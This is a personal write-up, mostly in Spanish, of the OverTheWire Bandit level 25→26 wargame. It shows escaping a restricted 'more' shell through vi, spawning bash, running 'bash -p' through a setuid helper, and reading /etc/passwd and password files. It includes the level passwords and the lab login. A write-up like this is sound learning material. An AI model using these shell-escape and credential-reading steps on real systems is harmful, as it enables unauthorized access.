Bandit Level 25 → Level 26
Level Goal

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
Commands you may need to solve this level

ssh, cat, more, vi, ls, id, pwd

ssh -p 2220  bandit25@bandit.labs.overthewire.org 
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

ANALISIS DE ARCHIVOS
cat /etc/passwd |grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0


EL more puede ser explotado, por que al usar
ssh -i bandit26.sshkey bandit26@localhost
Connection to localhost closed.
cierra la conexion


MINIMIZANDO LA CONSOLA , PUEDO UTILIZAR EL 
comando :e para editar /etc/bandit_pass/bandit26
 
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z     pero no me sirve

necesito spanw una shell
e:
shel=/bin/bash 
e:
shell
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ ./bandit27-do whoami
bandit27
bandit26@bandit:~$ ./bandit27-do bash -p
bash-4.4$ who am i
bash-4.4$ whoami
bandit27
bash-4.4$ 
bash-4.4$ cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea		# clave al sig. nivel 27
 



